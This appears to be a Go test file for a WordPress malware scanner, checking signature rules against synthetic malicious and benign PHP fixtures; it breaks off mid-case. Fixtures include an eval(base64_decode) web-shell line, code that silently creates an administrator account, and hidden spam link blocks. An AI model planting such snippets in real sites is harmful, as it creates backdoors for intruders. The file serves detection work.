package scan

import (
	"bufio"
	"bytes"
	"crypto/sha256"
	"encoding/hex"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

const evalSample = "<?php\n$x = 1;\neval(base64_decode($_POST['x']));\n"

const createAdminSample = `<?php
add_action('init', function () {
    $login = 'wp_support'; $passw = 'p'; $email = 'a@b.c';
    if ( !username_exists( $login )  && !email_exists( $email ) ) {
        $user_id = wp_create_user( $login, $passw, $email );
        $user = new WP_User( $user_id );
        $user->set_role( 'administrator' );
    }
});
`

const cleanSample = "<?php\nfunction theme_setup() { add_theme_support('title-tag'); }\nadd_action('after_setup_theme', 'theme_setup');\n"

// contractTestSample mirrors the bespoke-plugin contract test that Wordfence's
// indeex.infector rule flags: it reads sibling source with file_get_contents
// and never executes it. Our rules must stay quiet on it.
const contractTestSample = "<?php\n$root = dirname(__DIR__);\n$decision = file_get_contents($root . '/includes/Admin/Service.php');\nif (strpos($decision, 'class Service') === false) { echo 'missing'; exit(1); }\n"

func write(t *testing.T, dir, rel, content string) string {
	t.Helper()
	p := filepath.Join(dir, filepath.FromSlash(rel))
	if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(p, []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
	return p
}

func sum(s string) string {
	h := sha256.Sum256([]byte(s))
	return hex.EncodeToString(h[:])
}

func ids(f []Finding) []string {
	var out []string
	for _, x := range f {
		out = append(out, x.RuleID)
	}
	return out
}

func has(f []Finding, id string) bool {
	for _, x := range f {
		if x.RuleID == id {
			return true
		}
	}
	return false
}

func TestEngineSemantics(t *testing.T) {
	rs := &RuleSet{Version: 2, Rules: []Rule{
		{ID: "eval", Name: "eval", Severity: "critical", Prefilter: []string{"eval"}, Patterns: []string{`eval\s*\(\s*base64_decode`}},
		{ID: "require-all", Name: "both", Severity: "high", Require: []string{`wp_create_user`, `set_role`}, ExcludePaths: []string{"vendor/"}},
		{ID: "js-only", Name: "js", Severity: "low", FileTypes: []string{"js"}, Patterns: []string{`atob`}},
		{ID: "scoped", Name: "scoped", Severity: "low", IncludePaths: []string{"uploads/"}, Patterns: []string{`<\?php`}},
		{ID: "broken", Name: "broken", Severity: "low", Patterns: []string{`(`}},
	}, Hashes: []HashIOC{{SHA256: sum("IOC"), Name: "ioc file", Severity: "critical"}},
		AllowHashes: []string{sum(evalSample)}}

	s := New(rs, Options{Workers: 2})
	if len(s.Errors) != 1 || s.RuleCount() != 4 {
		t.Fatalf("expected 1 compile error and 4 rules, got %v / %d", s.Errors, s.RuleCount())
	}

	dir := t.TempDir()
	write(t, dir, "plugins/a/eval.php", "<?php eval ( base64_decode('x'));")
	write(t, dir, "plugins/a/admin.php", createAdminSample)
	write(t, dir, "vendor/x/admin.php", createAdminSample)
	write(t, dir, "themes/t/app.js", "var u = atob('aHR0cA==');")
	write(t, dir, "themes/t/app.php", "<?php $u = 'atob';")
	write(t, dir, "uploads/2026/x.php", "<?php echo 1;")
	write(t, dir, "plugins/b/x.php", "<?php echo 1;")
	write(t, dir, ".git/hooks/evil.php", "<?php eval(base64_decode('x'));")
	write(t, dir, "uploads/ioc.bin", "IOC")
	write(t, dir, "plugins/allowed.php", evalSample)

	res := s.ScanDir(dir)
	if len(res.Errors) != 0 {
		t.Fatalf("errors: %v", res.Errors)
	}
	got := map[string][]string{}
	for _, f := range res.Findings {
		got[f.File] = append(got[f.File], f.RuleID)
	}
	want := map[string][]string{
		"plugins/a/eval.php":  {"eval"},
		"plugins/a/admin.php": {"require-all"},
		"themes/t/app.js":     {"js-only"},
		"uploads/2026/x.php":  {"scoped"},
		"uploads/ioc.bin":     {"hash:" + sum("IOC")[:12]},
	}
	for file, rules := range want {
		if strings.Join(got[file], ",") != strings.Join(rules, ",") {
			t.Errorf("%s: want %v got %v", file, rules, got[file])
		}
	}
	for file := range got {
		if _, ok := want[file]; !ok {
			t.Errorf("unexpected finding on %s: %v", file, got[file])
		}
	}
	for _, f := range res.Findings {
		if f.File == "plugins/a/eval.php" && f.Line != 1 {
			t.Errorf("line: want 1 got %d", f.Line)
		}
		if f.SHA256 == "" {
			t.Errorf("%s: missing sha256", f.File)
		}
	}
	// Ten files written; the .git one is skipped by the walk, the rest are
	// scanned (hash indicators cover every extension).
	if res.Scanned != 9 {
		t.Errorf("counters: scanned=%d skipped=%d", res.Scanned, res.Skipped)
	}

	// KnownGood hook short-circuits before rules run.
	s2 := New(rs, Options{Workers: 1, KnownGood: func(h string) bool { return h == sum("<?php eval ( base64_decode('x'));") }})
	f, _ := s2.ScanFile(filepath.Join(dir, "plugins/a/eval.php"), "plugins/a/eval.php")
	if len(f) != 0 {
		t.Errorf("KnownGood not honored: %v", ids(f))
	}

	// Legacy shape carries the fields the malware-alert ingest reads.
	lf := res.Findings[0].Legacy()
	if lf.Filename == "" || lf.SignatureID == "" || lf.SignatureName == "" {
		t.Errorf("legacy conversion incomplete: %+v", lf)
	}
}

func TestLargeFileTailIsScanned(t *testing.T) {
	rs := &RuleSet{Version: 2, Rules: []Rule{{ID: "eval", Name: "eval", Severity: "critical", Patterns: []string{`eval\s*\(\s*base64_decode`}}}}
	s := New(rs, Options{Workers: 1, MaxBytes: 64 * 1024, NoDecode: true})
	dir := t.TempDir()
	big := append(bytes.Repeat([]byte("// filler line of harmless text\n"), 8000), []byte("\n<?php eval(base64_decode('x'));\n")...)
	p := filepath.Join(dir, "big.php")
	if err := os.WriteFile(p, big, 0o644); err != nil {
		t.Fatal(err)
	}
	f, err := s.ScanFile(p, "plugins/a/big.php")
	if err != nil {
		t.Fatal(err)
	}
	if len(f) != 1 || f[0].RuleID != "eval" {
		t.Fatalf("payload past MaxBytes not found: %v", ids(f))
	}
	if f[0].SHA256 != sum(string(big)) {
		t.Error("hash must cover the whole file")
	}
}

func TestLiteralFastPath(t *testing.T) {
	cases := map[string]*literalPattern{
		`\bFilesMan\b`:      {text: []byte("FilesMan"), boundStart: true, boundEnd: true},
		`<\?php`:            {text: []byte("<?php")},
		`font\-family: x`:   {text: []byte("font-family: x")},
		`\bshell_exec\s*\(`: nil, // \s is a regex construct
		`(?i)alfa`:          nil,
		`a|b`:               nil,
		`\$_POST\[`:         {text: []byte("$_POST[")},
	}
	for p, want := range cases {
		got := asLiteral(p)
		if (got == nil) != (want == nil) || (got != nil && (string(got.text) != string(want.text) || got.boundStart != want.boundStart || got.boundEnd != want.boundEnd)) {
			t.Errorf("asLiteral(%q) = %+v, want %+v", p, got, want)
		}
	}
	lp := asLiteral(`\bFilesMan\b`)
	if lp.find([]byte("x FilesManager y")) != nil || lp.find([]byte("x FilesMan y")) == nil || lp.find([]byte("FilesMan")) == nil {
		t.Error("word boundaries not honoured")
	}
	// The fast path and the regex must agree on the shipped rules.
	s := shippedRules(t)
	n := 0
	for _, r := range s.rules {
		for _, lp := range r.literals {
			if lp != nil {
				n++
			}
		}
	}
	if n == 0 {
		t.Error("expected literal fast-path patterns among the shipped rules")
	}
	t.Logf("%d literal patterns on the fast path", n)
}

func TestMinMatches(t *testing.T) {
	rs := &RuleSet{Version: 2, Rules: []Rule{
		{ID: "two-of", Name: "two of", Severity: "high", MinMatches: 2, Patterns: []string{`alpha`, `beta`, `gamma`}},
		{ID: "all-of", Name: "all of", Severity: "high", MinMatches: 3, Patterns: []string{`alpha`, `beta`, `gamma`}},
	}}
	s := New(rs, Options{Workers: 1, NoDecode: true})
	dir := t.TempDir()
	one := write(t, dir, "a.php", "<?php alpha();")
	two := write(t, dir, "b.php", "<?php alpha(); beta();")
	three := write(t, dir, "c.php", "<?php alpha(); beta(); gamma();")
	for path, want := range map[string][]string{one: nil, two: {"two-of"}, three: {"two-of", "all-of"}} {
		f, _ := s.ScanFile(path, filepath.Base(path))
		if strings.Join(ids(f), ",") != strings.Join(want, ",") {
			t.Errorf("%s: want %v got %v", filepath.Base(path), want, ids(f))
		}
	}
}

func TestV1RuleFileStillLoads(t *testing.T) {
	rs, err := ParseRuleSet([]byte(`[{"id":"a","name":"A","severity":"high","patterns":["foo"],"exclude_paths":["x/"]}]`))
	if err != nil {
		t.Fatal(err)
	}
	if rs.Version != 1 || len(rs.Rules) != 1 || rs.Rules[0].ExcludePaths[0] != "x/" {
		t.Fatalf("v1 parse: %+v", rs)
	}
}

func TestExtOf(t *testing.T) {
	for name, want := range map[string]string{
		"a/shell.php.bak": ".php", "x.php.suspected": ".php", "y.PHTML": ".phtml", "z.js": ".js",
		"w.bak": ".bak", "noext": "", "dir.php/readme.txt": ".txt",
	} {
		if got := ExtOf(name); got != want {
			t.Errorf("ExtOf(%q) = %q, want %q", name, got, want)
		}
	}
}

func TestExtensions(t *testing.T) {
	got := strings.Join(Extensions([]string{"js", ".txt", "JS"}), ",")
	if got != ".js,.mjs,.txt" {
		t.Errorf("Extensions: %s", got)
	}
	if strings.Join(Extensions(nil), ",") != ".inc,.phar,.php,.php5,.php7,.php8,.phtml" {
		t.Errorf("default extensions: %v", Extensions(nil))
	}
}

// shippedRules loads lib/malware-signatures.json plus every drop-in under
// lib/malware-signatures.d from the repo, exactly as LoadDefaultRuleSet does
// on a deployed CLI, so the fixtures guard imported rules too.
func shippedRules(t *testing.T) *Scanner {
	t.Helper()
	rs, err := LoadRuleSet(filepath.Join("..", "lib", "malware-signatures.json"))
	if err != nil {
		t.Fatal(err)
	}
	extra, _ := filepath.Glob(filepath.Join("..", "lib", "malware-signatures.d", "*.json"))
	for _, f := range extra {
		d, err := LoadRuleSet(f)
		if err != nil {
			t.Fatal(err)
		}
		rs.Merge(d)
	}
	s := New(rs, Options{})
	for _, e := range s.Errors {
		t.Errorf("shipped rule failed to compile: %v", e)
	}
	return s
}

func TestShippedRules(t *testing.T) {
	s := shippedRules(t)
	if s.RuleCount() < 30 || s.HashCount() < 8 {
		t.Fatalf("shipped rule set too small: %d rules, %d hashes", s.RuleCount(), s.HashCount())
	}
	dir := t.TempDir()
	write(t, dir, "themes/custom/functions.php", createAdminSample)
	write(t, dir, "plugins/x/x.php", evalSample)
	write(t, dir, "themes/custom/clean.php", cleanSample)
	write(t, dir, "plugins/bespoke/tests/phase10.php", contractTestSample)
	res := s.ScanDir(dir)
	if len(res.Errors) != 0 {
		t.Fatalf("errors: %v", res.Errors)
	}
	by := map[string][]Finding{}
	for _, f := range res.Findings {
		by[f.File] = append(by[f.File], f)
	}
	if !has(by["themes/custom/functions.php"], "createadmin") {
		t.Errorf("createadmin sample not caught: %v", ids(by["themes/custom/functions.php"]))
	}
	if !has(by["plugins/x/x.php"], "eval-decode-chain") {
		t.Errorf("eval sample not caught: %v", ids(by["plugins/x/x.php"]))
	}
	for _, clean := range []string{"themes/custom/clean.php", "plugins/bespoke/tests/phase10.php"} {
		if len(by[clean]) != 0 {
			t.Errorf("false positive on %s: %v", clean, ids(by[clean]))
		}
	}
}

// Legitimate code shapes that the first clean-tree run flagged. None may
// produce a finding at high or critical severity.
func TestShippedRulesStayQuietOnLegitimateCode(t *testing.T) {
	s := shippedRules(t)
	dir := t.TempDir()
	write(t, dir, "plugins/simple-history/inc/services/class-stealth-mode.php",
		"<?php\nadd_filter( 'all_plugins', [ $this, 'filter_all_plugins' ] );\n// Hide from the \"Go to Simple History\" link\nfunction filter_all_plugins( $plugins ) { if ( $this->is_stealth() ) { unset( $plugins[ $this->slug ] ); } return $plugins; }\n")
	write(t, dir, "plugins/wp-google-maps/includes/class.plugin.php",
		"<?php\n$csp = implode('', $csp);\n// Decided against this for beta launch\n// header_remove('Content-Security-Policy');\nheader($csp);\n")
	write(t, dir, "plugins/wp-file-manager/lib/codemirror/mode/powershell/index.html",
		"<!doctype html>\n<title>CodeMirror: Powershell mode</title>\n<meta charset=\"utf-8\"/>\n")
	write(t, dir, "plugins/mts-wp-notification-bar/includes/constant-contact/guzzlehttp/promises/src/Promise.php",
		"<?php\nswitch ($trans->state) {\n    case 'before': goto before;\n    case 'complete': goto complete;\n    case 'error': goto error;\n    case 'retry': goto retry;\n    case 'end': goto end;\n}\nbefore: $a = 1; complete: $b = 2; error: $c = 3; retry: $d = 4; end: return;\n")
	write(t, dir, "plugins/pixelyoursite/modules/url-normalizer/Normalizer.php",
		"<?php\nwhile (! empty($path)) {\n    $pattern_a   = '!^(\\.\\./|\\./)!x';\n    $pattern_b_1 = '!^(/\\./)!x';\n    $pattern_b_2 = '!^(/\\.)$!x';\n    $pattern_c   = '!^(/\\.\\./|/\\.\\.)!x';\n    $pattern_d   = '!^(\\.|\\.\\.)$!x';\n    $pattern_e   = '!^(/?[^/]*)!x';\n}\n")
	write(t, dir, "plugins/woocommerce-jetpack/includes/functions/wcj-functions-number-to-words.php",
		"<?php\nfunction convert_number_to_words( $number ) {\n\t$hyphen      = '-';\n\t$conjunction = ' and ';\n\t$separator   = ', ';\n\t$negative    = 'negative ';\n\t$decimal     = ' point ';\n\t$dictionary  = array( 0 => 'zero', 1 => 'one' );\n}\n")
	write(t, dir, "plugins/wc-shippo-shipping/includes/Admin/OneTeamSoftware.php",
		"<?php\nadd_menu_page('x', 'x', 'manage_options', $this->mainMenuId, array(&$this, 'display'), plugins_url('assets/images/icon.png', dirname(dirname(str_replace('phar://', '', __FILE__)))), 26);\n")
	write(t, dir, "plugins/link-whisper-premium/core/Wpil/Dashboard.php",
		"<?php\n$icon  = $item['icon'] ?? '!';\n$title = $item['title'] ?? '';\n$pill  = $item['pill'] ?? null;\n$review = $item['review'] ?? [];\n")
	write(t, dir, "themes/pro/framework/functions/pro/stacks/starter/css/starter-typography.css",
		"<?php /* Custom Fonts */ ?>\n\nbody,\ninput {\n  font-family: sans-serif;\n}\n")
	write(t, dir, "plugins/mapsvg/php/Domain/Token/TokenController.php",
		"<?php\n$userName = \"mapsvg\";\n$userEmail = \"support@mapsvg.com\";\n$user_id = wp_insert_user([\n\t\"user_login\" => $userName,\n\t\"user_pass\" => $random_password,\n\t\"user_email\" => $userEmail,\n\t\"role\" => \"administrator\",\n\t\"locale\" => \"en_US\"\n]);\n")
	write(t, dir, "plugins/cryptopay-wc-lite/assets/js/evm-chains-provider.js",
		"/*! ethers */function uint8ArrayToHexString(r){return r}const q={method:\"eth_call\",params:[t],jsonrpc:\"2.0\"};\n")
	write(t, dir, "plugins/shortcode-exec-php/editarea/edit_area/edit_area_compressor.php",
		"<?php\n$loader= preg_replace(\"/(t\\.scripts_to_load=\\s*)\\[([^\\]]*)\\];/e\", \"\\$this->replace_scripts('script_list', '\\\\1', '\\\\2')\", $loader);\n")
	write(t, dir, "plugins/error-log-monitor/Elm/Plugin.php",
		"<?php\n//Avoid race conditions.\n$handle = fopen(__FILE__, 'r');\nflock($handle, LOCK_EX);\nwp_cache_delete('alloptions', 'options');\n")
	write(t, dir, "plugins/wp-defender/lib/packages/Symfony/Component/Process/Process.php",
		"<?php\n// Workaround for the bug, when PTS functionality is enabled.\n$ptsWorkaround = fopen(__FILE__, 'r');\n$envPairs = [];\n")
	write(t, dir, "plugins/uncanny-automator/vendor/composer/autoload_classmap.php",
		"<?php\nreturn array(\n    'Uncanny_Automator\\\\Integrations\\\\Wordfence\\\\Wordfence_2fa_Deactivated' => $baseDir . '/src/integrations/wordfence/triggers/wordfence-2fa-deactivated.php',\n);\n")
	write(t, dir, "plugins/uncanny-automator/src/integrations/wordfence/triggers/wordfence-2fa-deactivated.php",
		"<?php\n/**\n * Fires when 2FA is disabled for a user, via the dedicated `wordfence_ls_2fa_deactivated` hook.\n */\nclass Wordfence_2fa_Deactivated {}\n")
	write(t, dir, "plugins/one-time-login/one-time-login.php",
		"<?php\nforeach ( $tokens as $i => $token ) {\n\tif ( hash_equals( $token, $_GET['one_time_login_token'] ) ) { $is_valid = true; unset( $tokens[ $i ] ); break; }\n}\nwp_set_auth_cookie( $user->ID, true, is_ssl() );\n")
	write(t, dir, "plugins/surecart/app/src/Models/User.php",
		"<?php\n$populate_cookie = function ( $logged_in_cookie ) { $_COOKIE[ LOGGED_IN_COOKIE ] = $logged_in_cookie; };\nadd_action( 'set_logged_in_cookie', $populate_cookie );\nwp_set_auth_cookie( $this->user->ID );\n")
	write(t, dir, "themes/bricks/includes/integrations/form/actions/login.php",
		"<?php\n$login_response = wp_signon( $creds, is_ssl() );\nif ( is_wp_error( $login_response ) ) { return; }\nwp_set_current_user( $login_response->ID );\nwp_set_auth_cookie( $login_response->ID, $remember );\n")
	write(t, dir, "themes/bricks/includes/frontend.php",
		"<?php\nupdate_user_meta( $user_id, 'bricks_user_activation_status', 'active' );\nif ( Database::get_setting( 'userActivationAutoLogin', false ) ) { wp_set_current_user( $user_id ); wp_set_auth_cookie( $user_id, false, is_ssl() ); }\n")
	write(t, dir, "themes/jupiter/framework/admin/control-panel/logic/template-management.php",
		"<?php\nupdate_user_meta( $user->ID, 'session_tokens', $session_tokens );\nwp_set_auth_cookie( $user_id, true );\ndo_action( 'wp_login', $user->user_login, $user );\n")
	write(t, dir, "themes/brandywine-hub/includes/event-handlers.php",
		"<?php\n$password = sanitize_text_field($_POST[\"password\"]);\n$user_id = wp_create_user($email, $password, $email);\nwp_set_current_user($user_id);\nwp_set_auth_cookie($user_id);\n")
	write(t, dir, "plugins/hubspot-content-embed/vendor/phar-io/manifest/tests/_fixture/test.phar",
		"<?php\nset_include_path('phar://' . __FILE__ . PATH_SEPARATOR . get_include_path());\n__HALT_COMPILER();\n")
	write(t, dir, "themes/betheme/functions/builder/class-mfn-builder-ajax.php",
		"<?php\n$builder = unserialize(call_user_func('base'.'64_decode', $builder), ['allowed_classes' => false]);\n")
	write(t, dir, "plugins/wp-job-manager-field-editor/classes/auto-output.php",
		"<?php\n$response = wp_remote_get( hex2bin('687474703a2f2f706c7567696e732e736d796c2e65732f3f77632d6170693d736d796c65732d7468656d652d636865636b') . \"&\" . $check_string );\n")
	write(t, dir, "plugins/astra-pro-sites/inc/classes/class-astra-sites.php",
		"<?php\ncheck_ajax_referer( 'astra-sites', '_ajax_nonce' );\n$response = wp_remote_get( $_POST['url'] );\n")
	write(t, dir, "plugins/blog2social/views/b2s/html/header.php",
		"<!--Header-->\n<?php\nif (!defined('ABSPATH')) { exit; }\n")
	write(t, dir, "plugins/subscribe2/classes/class-s2-admin.php",
		"<?php\n$icon = plugins_url( 'include/email-edit.png' );\n$mysubscribe2->include_dir = 'include/img/check-button.png'; ?>\n")
	write(t, dir, "plugins/iq-block-country/vendor/guzzle/guzzle/build/autoload.php",
		"<?php\nrequire 'phar://' . __FILE__ . DIRECTORY_SEPARATOR . str_replace('\\\\', DIRECTORY_SEPARATOR, $class) . '.php';\n")
	write(t, dir, "plugins/op-dashboard/src/Services/SupportAccessManager.php",
		"<?php\n$userId = wp_create_user($username, $password, $email);\n$user = new WP_User($userId);\n$user->set_role('administrator');\n")
	write(t, dir, "plugins/oxygen/component-framework/includes/ajax.php",
		"<?php\n$response = wp_remote_get( $_REQUEST['soundcloud_url'] );\n")
	write(t, dir, "plugins/all-in-one-wp-migration-pro/lib/model/reset/class-ai1wmke-reset-database.php",
		"<?php\n$user_id = wp_insert_user( array( 'user_login' => $login, 'user_pass' => $pass, 'role' => 'administrator' ) );\n$user = new WP_User( $user_id );\nwp_set_auth_cookie( $user_id );\n")
	write(t, dir, "plugins/fusion-builder/inc/class-fusion-form-auth-actions.php",
		"<?php\n$user = wp_signon( array( 'user_login' => $_POST['user'], 'user_password' => $_POST['pass'] ) );\nif ( ! is_wp_error( $user ) ) { wp_set_auth_cookie( $user_id, false, is_ssl() ); }\n")
	write(t, dir, "plugins/jetpack/extensions/blocks/premium-content/_inc/subscription-service/class-jwt.php",
		"<?php\nfor ( $i = 0; $i < $len; $i++ ) { $status |= ( ord( $signature[ $i ] ) ^ ord( $hash[ $i ] ) ); }\n")
	write(t, dir, "plugins/fusion-builder/inc/lib/inc/recaptcha/src/ReCaptcha/RequestMethod/Curl.php",
		"<?php\n$ch = curl_init(); $response = curl_exec($ch); exec($cmd);\n")
	write(t, dir, "plugins/wordpress-importer/vendor/brick/math/src/BigInteger.php",
		"<?php\nassert($condition, $message);\nassert( $pointer->isSpecial() );\n")
	write(t, dir, "plugins/wordpress-importer/php-toolkit/XML/class-xmlprocessor.php",
		"<?php\n$invalid = \"\\x00\\x09\\x0A\\x0D\\x20#/:<>?@[\\\\]^|\";\n")
	write(t, dir, "plugins/fusion-builder/front-end/fusion-frontend-combined.min.js",
		"var a=atob(e),n=new Uint8Array(a.length);fetch(u).then(r=>r.json());eval(\"[function _expression_function(){\"+v+\"}]\");")
	write(t, dir, "plugins/redirection/redirection.php", "<?php\nopcache_reset(); // phpcs:ignore\n")
	write(t, dir, "plugins/cleantalk-spam-protect/lib/Cleantalk/Common/SupportUser.php",
		"<?php\n$user = new WP_User( $user_id );\n$user->set_role('administrator');\n")
	write(t, dir, "plugins/seo-by-rank-math/includes/modules/sitemap/abstract-xml.php",
		"<?php\nheader( 'Cache-Control: no-cache, no-store, must-revalidate, max-age=0' );\n")
	write(t, dir, "plugins/wpforms-lite/src/Admin/PluginsCategory.php",
		"<?php\nadd_filter( 'plugins_list', [ $this, 'add_category' ] );\n")
	write(t, dir, "plugins/download-monitor/src/Shop/Session/Factory.php",
		"<?php\n$key = hash( 'sha256', get_option( 'session_key', true ) . $_SERVER['REMOTE_ADDR'] );\n")
	write(t, dir, "plugins/waterwoo-pdf-premium/lib/tcpdf/tcpdf/tcpdf_barcodes_1d.php",
		"<?php\n$chars = chr(0).chr(1).chr(2).chr(3).chr(4).chr(5).chr(6).chr(7).chr(8).chr(9);\n")
	write(t, dir, "plugins/mojo-marketplace-wp-plugin/vendor/bluehost/endurance-wp-module-sso/functions.php",
		"<?php\n$users = get_users( array( 'role' => 'administrator', 'number' => 1 ) );\nif ( isset( $users[0] ) ) { wp_set_auth_cookie( $users[0]->ID ); }\n")
	write(t, dir, "mu-plugins/captaincore-helper.php",
		"<?php\nif ( 'wp-login.php' !== $pagenow || empty( $_GET['user_id'] ) || empty( $_GET['captaincore_login_token'] ) ) { return; }\n$user = get_user_by( 'id', (int) $_GET['user_id'] );\nwp_set_auth_cookie( $user->ID );\n")
	write(t, dir, "uploads/backupbuddy_temp/abc/importbuddy.php",
		"<?php\n$fh = fopen( __FILE__, 'r' ); fseek( $fh, __COMPILER_HALT_OFFSET__ );\n")
	write(t, dir, "plugins/really-simple-ssl/security/wordpress/two-fa/class-rsssl-two-factor.php",
		"<?php\n$token = $_GET['rsssl_token'] ?? '';\nif ( hash_equals( $stored, $token ) ) { wp_set_auth_cookie( $user_id ); }\n")
	write(t, dir, "plugins/akismet/akismet.php",
		"<?php\n/**\n * Plugin Name: Akismet Anti-spam: Spam Protection\n * Author: Automattic - Anti-spam Team\n */\n")
	write(t, dir, "plugins/some-theme-helper/style.php",
		"<?php ?><a class=\"skip-link screen-reader-text\" href=\"#content\">Skip</a><style>.screen-reader-text{position:absolute;left:-9999px}</style>\n")
	write(t, dir, "plugins/capability-manager-enhanced/includes/roles/class/class-pp-roles-actions.php",
		"<?php\n$level = ($_REQUEST['current_role'] === 'administrator') ? 10 : absint($_REQUEST['role_level']);\n$role = get_role('administrator'); $user->set_role($_REQUEST['current_role']); wp_set_current_user($id);\n")
	write(t, dir, "plugins/beehive-analytics/dependencies/vendor/google/auth/src/FetchAuthTokenCache.php",
		"<?php\n/**\n * Require use of OpenSSL for local signing. Does nothing else.\n * Include the cache. REQUIRED for Eval mode.\n */\nrequire_once __DIR__ . '/x.php';\n")
	write(t, dir, "plugins/wordpress-seo/src/llms-txt/handler.php",
		"<?php\n$bom = \"\\xEF\\xBB\\xBF\";\n$table = \"\\x20\\x65\\x69\\x61\\x73\\x6E\\x74\\x72\\x6F\\x6C\\x75\\x64\";\n")
	write(t, dir, "themes/twentytwentyone/functions.php",
		"<?php\n$black = '#000000'; $dark_gray = '#28303D'; $gray = '#39414D'; $green = '#D1E4DD'; $blue = '#D1DFE4'; $purple = '#D1D1E4'; $red = '#E4D1D1'; $orange = '#E4DAD1'; $yellow = '#EEEADD';\n")
	write(t, dir, "wp-content/uploads/.htaccess",
		"# Protect uploads\n<FilesMatch \"\\.(php|phtml)$\">\nOrder allow,deny\nDeny from all\n</FilesMatch>\n")
	write(t, dir, ".htaccess",
		"# BEGIN WordPress\nRewriteEngine On\nRewriteBase /\nRewriteRule ^index\\.php$ - [L]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteRule . /index.php [L]\n# END WordPress\nRewriteCond %{HTTP_HOST} ^www\\.example\\.com$ [NC]\nRewriteRule ^(.*)$ https://example.com/$1 [R=301,L]\n")
	write(t, dir, "plugins/code-snippets/dist/edit.css",
		".cm-php { color: #c00 } /* highlights <?php tags in the editor */\n")
	write(t, dir, "plugins/code-snippets/dist/manage.js",
		"var t = '<?php'; if (code.indexOf('<?php') === 0) { strip(); }\n")
	write(t, dir, "plugins/fusion-builder/inc/lib/inc/redux/import_export.php",
		"<?php\nif ( $_COOKIE['fusionredux_current_tab'] == 'import_export_default' ) { $tab = 'import'; }\nif ( $_POST['display_username_for'] == 'current_user' ) { $u = wp_get_current_user(); }\n")
	write(t, dir, "plugins/gravityformssignature/class-gf-signature.php",
		"<?php\nif ( substr( $data, 0, 8 ) === \"\\x89PNG\\x0d\\x0a\\x1a\\x0a\" ) { $type = 'png'; }\n")
	write(t, dir, "plugins/wordfence/vendor/wordfence/wf-waf/src/lib/parser/sqli.php",
		"<?php\n$keywords = array('REQUIRE', 'SELECT', 'UNION');\n")
	write(t, dir, "plugins/wp-smush-pro/core/class-image.php",
		"<?php\n$data = file_get_contents( $path . '/thumb.jpg' ); $img = imagecreatefromjpeg( $path . '/thumb.jpg' ); $exif = exif_read_data( $file ); if ( ! empty( $exif['Orientation'] ) ) { $img = imagerotate( $img, 180, 0 ); }\n")
	write(t, dir, "themes/t/inc/template-tags.php",
		"<?php\nrequire_once get_template_directory() . '/inc/customizer.php';\ninclude locate_template( 'template-parts/content.php' );\n$css = file_get_contents( get_template_directory() . '/style.css' );\n")
	write(t, dir, "plugins/hub-core/extras/redux-framework/ReduxCore/inc/fields/typography/field_typography.json",
		"<?php exit(); ?>\n{\"fonts\": {\"Arial\": \"sans-serif\"}}\n")
	write(t, dir, "plugins/trx_addons/components/theme-panel/importer/export/layouts.txt",
		"<?php exit; ?>\na:1:{s:6:\"layout\";s:4:\"wide\";}\n")
	write(t, dir, "themes/oceanwp/woocommerce/share.php",
		"<?Php oceanwp_icon( 'facebook' ); ?></a>\n")
	write(t, dir, "plugins/jetpack/modules/widgets/class-jetpack-instagram-widget.php",
		"<?php // Include hidden fields for the widget settings before a connection is made\nrequire_once __DIR__ . '/x.php';\n")
	write(t, dir, "plugins/woocommerce/includes/gateways/paypal/class-wc-gateway-paypal.php",
		"<?php\n$this->icon = apply_filters( 'woocommerce_paypal_icon', WC()->plugin_url() . '/includes/gateways/paypal/assets/images/paypal.png' );\n$this->include_assets( 'admin.css' );\n")
	write(t, dir, "plugins/jetpack/jetpack_vendor/automattic/jetpack-forms/src/contact-form/templates/email-response.php",
		"<!-- Powered By -->\n<?php echo esc_html( $response ); ?>\n")
	write(t, dir, "plugins/simply-gallery-block/freemius/templates/connect.php",
		"<?php\n$css = WP_FS__DIR_CSS;\ninclude WP_FS__DIR_CSS . '/admin/connect.css';\n")
	write(t, dir, "plugins/intelly-related-posts/includes/classes/utils/Utils.php",
		"<?php\nwp_enqueue_style( 'irp-buttons', plugins_url( 'includes/css/buttons.min.css', IRP_PLUGIN_FILE ) );\nrequire_once IRP_PLUGIN_PATH . 'includes/classes/utils/Loader.php';\n")
	write(t, dir, "plugins/translatepress-developer/add-ons-pro/automatic-language-detection/includes/class-ald-cookie-sync.php",
		"<?php\nheader_remove( 'Content-Security-Policy' );\nheader( 'X-Frame-Options: ALLOWALL' );\n")
	write(t, dir, "plugins/translatepress-developer/add-ons-pro/multiple-domains/class-trp-language-domains-sso.php",
		"<?php\nif ( isset( $_GET[ self::IFRAME_USER_STATUS_KEY ] ) && $_GET[ self::IFRAME_USER_STATUS_KEY ] == 'trp_user_signed_in' ) { wp_clear_auth_cookie(); $user = get_user_by( 'id', $this->current_user_id ); if ( $user ) { wp_set_auth_cookie( $user->ID ); } }\n")
	write(t, dir, "plugins/formidable/classes/views/styles/_styles-edit.php",
		"<?php\n// Include a hidden input for new styles so the new style name updates.\nrequire FrmAppHelper::plugin_path() . '/x.php';\n")
	write(t, dir, "plugins/buddyboss-platform/bp-core/admin/classes/class-bb-support-access.php",
		"<?php\n$id = wp_insert_user( array( 'user_login' => self::USER_LOGIN, 'user_email' => self::USER_EMAIL, 'role' => 'administrator' ) );\n")
	res := s.ScanDir(dir)
	for _, f := range res.Findings {
		if SeverityRank(f.Severity) >= SeverityRank("high") {
			t.Errorf("false positive at %s: %s on %s:%d %q", f.Severity, f.RuleID, f.File, f.Line, f.Match)
		}
	}
}

// Shapes written from the harvest corpus (synthetic stand-ins, not customer
// files). Each must fire at high or critical.
func TestShippedRulesCatchCorpusFamilies(t *testing.T) {
	s := shippedRules(t)
	dir := t.TempDir()
	cases := map[string]struct{ content, rule string }{
		"themes/x/vendor/lib/Header.php":                    {"<?php\nclass Header {}\n?><div style=\"position:absolute; left:-2083px; top:-2274px;\"><a href=\"http://example.invalid/dofa/pharmacy-express\">pharmacy express</a><a href=\"http://example.invalid/dofa/super-viagra-active\">super viagra active</a></div>\n", "hidden-pharma-links"},
		"themes/x/footer.php":                               {"<?php get_footer(); ?>\n<div style=\"position:absolute; left:-9999px;\"><a href=\"https://example.invalid/a\">one</a><a href=\"https://example.invalid/b\">two</a><a href=\"https://example.invalid/c\">three</a></div>\n", "offscreen-link-block"},
